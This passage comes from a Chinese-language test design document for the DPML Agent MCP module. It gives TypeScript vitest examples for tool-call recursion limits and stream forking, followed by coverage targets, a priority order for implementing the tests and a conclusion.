          toolCall: { name: 'startTool', parameters: {} },
          status: 'success',
          result: 'Initial result'
        }
      ]
    });
    
    // 执行处理（会触发多次递归）
    const result = await processor.process(context);
    
    // 验证：管道被执行，但达到限制后停止
    expect(mockPipeline.execute).toHaveBeenCalledTimes(5); // 深度限制为5
    expect(result.finalResponse).toBeDefined();
    expect(result.finalResponse.content).toContain('最大工具调用深度');
  });
});
```

### 9.4 流式分叉测试示例

```typescript
// packages/agent/src/__tests__/unit/core/mcp/pipeline/processors/StartSideBandProcessor.test.ts
import { describe, test, expect, vi, beforeEach } from 'vitest';
import { StartSideBandProcessor } from '../../../../../../core/mcp/pipeline/processors/StartSideBandProcessor';
import { AsyncResponseStreamSimulator } from '../../../../../fixtures/mcp.fixture';

describe('UT-MCP-SideBand', () => {
  let processor;
  let mockUserFlowContent;
  
  beforeEach(() => {
    processor = new StartSideBandProcessor();
    mockUserFlowContent = [];
    
    // 模拟全局输出函数
    global.captureUserFlowChunk = vi.fn((chunk) => {
      mockUserFlowContent.push(chunk);
    });
  });
  
  test('应分别处理客户端展示流和pipeline处理流', async () => {
    // 创建模拟响应流
    const responseChunks = [
      { role: 'assistant', content: '我正在思考' },
      { role: 'assistant', content: '我需要使用工具<function_calls>\n<invoke name="testTool">\n<parameter name="param1">value1</parameter>\n</invoke>\n</function_calls>' },
      { role: 'assistant', content: '让我用这个工具的结果来回答' }
    ];
    
    const mockStream = new AsyncResponseStreamSimulator(responseChunks);
    
    // 创建上下文对象
    const context = {
      messages: [],
      stream: true,
      response: mockStream
    };
    
    // 模拟fork函数以验证分叉行为
    const forkSpy = vi.spyOn(processor as any, 'forkProcessing');
    
    // 执行处理
    await processor.process(context);
    
    // 验证fork处理被调用
    expect(forkSpy).toHaveBeenCalledWith(expect.anything());
    
    // 验证原始上下文保持不变
    expect(context.response).toBe(mockStream);
    
    // 执行被fork的处理（正常情况下是异步的，但测试中同步调用）
    const collectSpy = vi.spyOn(processor as any, 'collectStreamContent');
    await (processor as any).forkProcessing(mockStream);
    
    // 验证内容被收集用于处理
    expect(collectSpy).toHaveBeenCalled();
    
    // 清理
    forkSpy.mockRestore();
    collectSpy.mockRestore();
  });
  
  test('客户端流和处理流应独立运行不互相阻塞', async () => {
    // 创建大量块的模拟流，用于测试并行性能
    const manyChunks = Array.from({ length: 20 }, (_, i) => ({ 
      role: 'assistant', 
      content: `Chunk ${i}${i === 10 ? ' <function_calls><invoke name="testTool"><parameter name="param1">value1</parameter></invoke></function_calls>' : ''}`
    }));
    
    const mockStream = new AsyncResponseStreamSimulator(manyChunks, 5); // 每块5ms延迟
    
    // 跟踪处理时间
    const startTime = Date.now();
    
    // 同时跟踪客户端展示和pipeline处理
    const userFlowPromise = new Promise<void>(async resolve => {
      for await (const chunk of mockStream) {
        mockUserFlowContent.push(chunk);
      }
      resolve();
    });
    
    const collectPromise = (processor as any).collectStreamContent(mockStream);
    
    // 等待两者完成
    await Promise.all([userFlowPromise, collectPromise]);
    
    const duration = Date.now() - startTime;
    
    // 验证总耗时小于串行处理时间（串行时间应为2*chunks*delay）
    // 证明两个流是并行处理的
    expect(duration).toBeLessThan(2 * manyChunks.length * 5);
    
    // 验证两个流都收到了所有内容
    expect(mockUserFlowContent.length).toBe(manyChunks.length);
    expect(collectPromise).toBeDefined();
  });
});
```

## 10. 测试覆盖率目标

依据DPML测试策略规则，设定如下覆盖率目标：

| 组件 | 行覆盖率目标 | 分支覆盖率目标 | 优先级 |
|-----|------------|-------------|--------|
| 处理器责任链 | >90% | >85% | 高 |
| ToolCallExtractorProcessor | >95% | 100% | 高 |
| ToolExecutionProcessor | >95% | 100% | 高 |
| StartSideBandProcessor | >95% | 100% | 高 |
| RecursiveProcessor | >95% | 100% | 高 |
| McpEnhancer | >90% | >85% | 中 |
| McpRegistry | >85% | >80% | 中 |
| API层 | >90% | >85% | 低 |

## 11. 优先级和实施顺序

测试实施应按以下优先级顺序进行：

1. **工具调用提取器测试**：ToolCallExtractorProcessor是模块的核心，直接决定模块是否能识别工具调用
2. **处理器责任链集成测试**：验证处理器之间的协作和数据流
3. **工具执行和结果格式化测试**：确保工具能被正确执行和结果能被格式化
4. **流式处理和分叉测试**：验证流式体验不被工具调用阻断
5. **端到端测试**：验证完整用户交互场景
6. **SDK集成测试**：验证与官方SDK的集成
7. **契约测试**：验证API和类型定义的稳定性

## 12. 结论

本文档详细设计了DPML Agent MCP模块的测试用例，重点关注责任链模式下处理器的协作测试、关键组件的单元测试、端到端用户场景测试和契约测试。测试用例设计遵循DPML测试策略规则，确保全面验证MCP模块的功能和质量。

测试设计重点关注以下几个方面：
- 处理器链的协作和数据流
- 工具调用的提取和执行
- 流式输出体验与工具调用的结合
- 多轮工具调用的递归处理
- 与官方ModelContextProtocol SDK的集成

通过全面的测试覆盖，确保Agent MCP模块能够稳定可靠地为Agent提供工具调用能力，增强大语言模型的功能和应用场景。